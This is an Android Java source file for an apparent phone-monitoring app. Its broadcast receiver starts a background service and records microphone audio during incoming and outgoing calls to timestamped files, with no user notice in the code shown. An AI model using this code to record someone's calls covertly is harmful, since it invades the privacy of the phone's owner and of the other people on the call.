package com.monitor.phone.s0ft.phonemonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Receives phone call state broadcasts from the android system
 * <p>
 * Logic:
 * <p>
 * ringing->offhook->idle : incoming call active->end
 * offhook->idle : outgoing call ended
 * <p>
 * engage at ringing or offhook
 * disengage at idle
 **/

public class CallStateBroadcastReceiver extends BroadcastReceiver {
    private static MediaRecorder mediaRecorder;
    private static boolean recordingState;
    private static String outputFileName;

    @Override
    public void onReceive(Context context, Intent intent) {
        Intent startMainServiceIntent = new Intent(context, MainService.class);
        context.startService(startMainServiceIntent);

        String action = intent.getAction();
        if (action != null && action.equals("android.intent.action.PHONE_STATE")) {
            String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            if (number != null) {
                String callState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
                Log.w(AppSettings.getTAG(), "Broadcast received!\n" + action + number + callState);
                if (callState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK) || callState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                    if (!recordingState) {
                        /* start recording audio */
                        DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.getDefault());
                        outputFileName = context.getFilesDir().getAbsolutePath() + "/" + dateFormat.format(new Date()) + ".mp4.tmp";
                        mediaRecorder = new MediaRecorder();
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                        mediaRecorder.setOutputFile(outputFileName);
                        try {
                            mediaRecorder.prepare();
                            mediaRecorder.start();
                            recordingState = true;
                            Log.w(AppSettings.getTAG(), "Recording started to " + outputFileName);
                        } catch (IOException ioexception) {
                            Log.w(AppSettings.getTAG(), ioexception.getMessage() + " while recording audio.");
                            mediaRecorder.release();
                            recordingState = false;
                        }
                    }
                } else if (callState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                    if (recordingState) {
                        mediaRecorder.stop();
                        mediaRecorder.release();
                        HelperMethods.renameTmpFile(outputFileName);//rename .tmp to .mp4
                        HelperMethods.removeBrokenTmpFiles(context.getFilesDir().getAbsolutePath() + "/");//remove any orphan .tmp files
                        recordingState = false;
                        Log.w(AppSettings.getTAG(), "Recording stopped");
                    }
                }

            }


        }

    }
}
